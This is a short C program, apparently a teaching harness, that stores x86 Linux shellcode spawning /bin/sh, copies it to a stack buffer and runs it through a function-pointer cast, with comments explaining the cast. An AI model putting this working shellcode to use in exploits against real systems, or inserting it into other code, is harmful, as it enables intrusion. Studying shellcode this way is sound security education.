#include<stdio.h>
#include<string.h>
//Shellcode for /bin/sh
const char code[]=
	"\x31\xc0\x50\x68//sh\x68/bin"
	"\x89\xe3\x50\x53\x89\xe1\x99"
	"\xb0\x0b\xcd\x80";


int main(int argc,char **argv){
	
//Copy shell-code in bchar array 	
char buffer[sizeof(code)];
strcpy(buffer,code);
	
/*
void(*)() -> Pointer to the Function which returns NULL and have inderminate arguments
(void(*)()) -> Typecasting
((void(*)())buffer) -> Typecast to buffer
((void(*)())buffer)() -> Calling Function passing no arguments
buffer is pointer to function and calls the fucntion
*/		
	
((void(*)())buffer)();
return 0;
}
